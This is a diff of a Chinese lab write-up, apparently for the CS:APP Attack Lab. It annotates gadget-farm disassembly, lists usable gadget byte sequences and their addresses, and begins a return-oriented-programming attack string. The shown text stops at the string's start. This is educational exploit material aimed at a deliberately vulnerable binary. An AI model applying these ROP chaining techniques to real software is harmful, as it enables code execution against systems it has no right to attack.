@@ -365,36 +365,36 @@ ROP的策略是从现有的程序代码找出这样的字节序列：它可以�
 
 ```c
 getval_142:
-  40199a:	b8 fb 78 [90 90] 	movl	$2425387259, %eax
-  40199f:	[c3] 	retq
+  40199a:	b8 fb 78 【90 90】 	movl	$2425387259, %eax
+  40199f:	c3】 	retq
 
 addval_273:
-  4019a0:	8d 87 [48 89 c7] [c3] 	leal	-1010333368(%rdi), %eax
-  4019a6:	[c3] 	retq
+  4019a0:	8d 87 【48 89 c7】 【c3】 	leal	-1010333368(%rdi), %eax
+  4019a6:	【c3】 	retq
 
 addval_219:
-  4019a7:	8d 87 51 73 [58] [90] 	leal	-1873251503(%rdi), %eax
-  4019ad:	[c3] 	retq
+  4019a7:	8d 87 51 73 【58】 【90】 	leal	-1873251503(%rdi), %eax
+  4019ad:	【c3】 	retq
 
 setval_237:
-  4019ae:	c7 07 [48 89 c7] c7 	movl	$3351742792, (%rdi)
-  4019b4:	[c3] 	retq
+  4019ae:	c7 07 【48 89 c7】 c7 	movl	$3351742792, (%rdi)
+  4019b4:	【c3】 	retq
 
 setval_424:
-  4019b5:	c7 07 54 c2 [58] 92 	movl	$2455290452, (%rdi)
-  4019bb:	[c3] 	retq
+  4019b5:	c7 07 54 c2 【58】 92 	movl	$2455290452, (%rdi)
+  4019bb:	【c3】 	retq
 
 setval_470:
   4019bc:	c7 07 63 48 8d c7 	movl	$3347925091, (%rdi)
-  4019c2:	[c3] 	retq
+  4019c2:	【c3】 	retq
 
 setval_426:
-  4019c3:	c7 07 [48 89 c7] [90] 	movl	$2428995912, (%rdi)
-  4019c9:	[c3] 	retq
+  4019c3:	c7 07 【48 89 c7】 【90】 	movl	$2428995912, (%rdi)
+  4019c9:	【c3】 	retq
 
 getval_280:
-  4019ca:	b8 29 [58] [90] [c3] 	movl	$3281016873, %eax
-  4019cf:	[c3] 	retq
+  4019ca:	b8 29 【58】 【90】 【c3】 	movl	$3281016873, %eax
+  4019cf:	【c3】 	retq
 ```
 
 根据Writeup给出的编码表可知，在上述代码中，可以使用的字节序列（已使用中括号标出）有：
@@ -423,15 +423,15 @@ popq %rax       => 58
 
 ```assembly
 addval_219:
-  4019a7:	8d 87 51 73 [58] 90 	leal	-1873251503(%rdi), %eax
+  4019a7:	8d 87 51 73 【58】 90 	leal	-1873251503(%rdi), %eax
   4019ad:	c3 	retq
 
 setval_424:
-  4019b5:	c7 07 54 c2 [58] 92 	movl	$2455290452, (%rdi)
+  4019b5:	c7 07 54 c2 【58】 92 	movl	$2455290452, (%rdi)
   4019bb:	c3 	retq
 
 getval_280:
-  4019ca:	b8 29 [58] 90 c3 	movl	$3281016873, %eax
+  4019ca:	b8 29 【58】 90 c3 	movl	$3281016873, %eax
   4019cf:	c3 	retq
 ```
 
@@ -449,15 +449,15 @@ movq %rax, %rdi => 48 89 c7
 
 ```assembly
 addval_273:
-  4019a0:	8d 87 [48 89 c7] c3 	leal	-1010333368(%rdi), %eax
+  4019a0:	8d 87 【48 89 c7】 c3 	leal	-1010333368(%rdi), %eax
   4019a6:	c3 	retq
 
 setval_237:
-  4019ae:	c7 07 [48 89 c7] c7 	movl	$3351742792, (%rdi)
+  4019ae:	c7 07 【48 89 c7】 c7 	movl	$3351742792, (%rdi)
   4019b4:	c3 	retq
 
 setval_426:
-  4019c3:	c7 07 [48 89 c7] 90 	movl	$2428995912, (%rdi)
+  4019c3:	c7 07 【48 89 c7】 90 	movl	$2428995912, (%rdi)
   4019c9:	c3 	retq
 ```
 
@@ -485,11 +485,11 @@ ec 17 40 00 00 00 00 00 # touch2的地址
 
 建议：标准答案需要8个gadget（有重复）。
 
-```assembly
-mid_farm:
-  4019d0:	b8 01 00 00 00 	movl	$1, %eax
-  4019d5:	c3 	retq
+从start_farm到mid_farm之间的汇编代码在任务四中已经给出，这里不再赘述。
 
+从mid_farm到end_farm之间的汇编代码如下：
+
+```assembly
 add_xy:
   4019d6:	48 8d 04 37 	leaq	(%rdi,%rsi), %rax
   4019da:	c3 	retq
@@ -621,21 +621,9 @@ getval_472:
 setval_350:
   401aab:	c7 07 【48 89 e0】 90 	movl	$2430634312, (%rdi)
   401ab1:	c3 	retq
-
-end_farm:
-  401ab2:	b8 01 00 00 00 	movl	$1, %eax
-  401ab7:	c3 	retq
-  401ab8:	90 	nop
-  401ab9:	90 	nop
-  401aba:	90 	nop
-  401abb:	90 	nop
-  401abc:	90 	nop
-  401abd:	90 	nop
-  401abe:	90 	nop
-  401abf:	90 	nop
 ```
 
-据Writeup给出的编码表可知，在上述代码中，可以使用的字节序列（已使用中括号标出）有：
+据Writeup给出的编码表可知，在start_farm到end_farm中，可以使用的字节序列（使用中括号标出）有：
 
 ```assembly
 # 省略了ret、nop以及functional nop指令
@@ -654,7 +642,7 @@ end_farm:
 89 e0 => movl %esp, %eax
 ```
 
-思路：栈的位置是随机的，无法直接得到cookie的起始地址。鉴于该情况，可以使用栈顶地址加上偏移量来确定cookie的起始地址。
+思路：栈的位置是随机的，无法直接得到cookie的起始地址，但可以使用栈顶地址加上偏移量来确定cookie的起始地址。
 
 注意到，在函数add_xy:
 
@@ -839,9 +827,9 @@ add_xy:
 
 其起始地址为`4019d6`。
 
-8.`movq %rax, %rdi`与第二步相同，可以使用addval_273和setval_426中的字节序列，起始地址分别为`4019a3`和`4019c5`。
+8.`movq %rax, %rdi`与第二步相同，可以使用addval_273和setval_426中的字节序列，起始地址分别为`4019a2`和`4019c5`。
 
-综上所述，我们可以得出最终的攻击字符串：
+综上所述，我们可以得出最终的攻击字符串： 
 
 ```assembly
 00 00 00 00 00 00 00 00
